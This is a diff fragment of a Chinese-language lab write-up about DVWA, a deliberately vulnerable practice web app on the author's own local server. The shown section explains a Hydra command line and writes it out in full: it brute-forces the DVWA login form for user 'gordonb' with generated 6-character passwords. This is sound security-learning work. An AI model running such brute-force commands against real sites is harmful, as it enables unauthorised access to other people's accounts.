@@ -103,12 +103,19 @@ MariaDB [dvwa]> select * from users;
 ## Brute Force Attack
 
 先玩了一下暴力破解的模块
+
 找到了Kali Linux的密码破解工具箱里有一个叫Hydra的东东，打开是一堆命令行：
+
 研究了半天命令行怎么用，最终琢磨出来下面的命令行：
+
 `-x 6:6:a1` 表示，即时生成6位以小写字母和数字构成的密码，逐个尝试
+
 `127.0.0.1` 自己搭建的服务器地址，应为网站域名
+
 `http-post-form` 帐号密码提交属于这个请求类别
+
 `/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:S=logout ^USER^ ^PASS^` 均为占位符，对应前面的用户名和密码
+
 
 ```
 hydra -l gordonb -x 6:6:a1 127.0.0.1 http-post-form "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:S=logout" -vV -f
